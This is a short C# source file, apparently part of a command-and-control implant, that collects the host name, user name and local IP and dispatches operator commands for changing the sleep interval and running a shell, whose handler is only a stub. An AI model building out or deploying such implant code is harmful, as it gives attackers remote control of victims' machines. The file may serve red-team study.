using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;

namespace C2
{
    class Function
    {
        public static string GetHostName()
        {
            string HostName = Environment.MachineName;
            return HostName;
        }
        public static string GetWhoami()
        {
            string Whoami = Environment.UserName;
            return Whoami;
        }
        public static string GetLocalIP()
        {
            return Dns.GetHostEntry(Dns.GetHostName()).AddressList[1].ToString();
        }

        public static string Run(string[] command)
        {
            var MethodName = command[0];
            switch (MethodName.ToLower())
            {
                case "sleep":
                    return Sleep(command);
                case "shell":
                    return Cmd(command);
                default:
                    break;
            }
            return "Command not found";
        }
        public static string Sleep(string[] command)
        {
            Config.Sleep = Convert.ToInt32(command[1]) * 1000;
            return "sleep:" + Config.Sleep;
        }
        public static string Cmd(string[] command)

        {

            return "hello word";
        }
    }
}
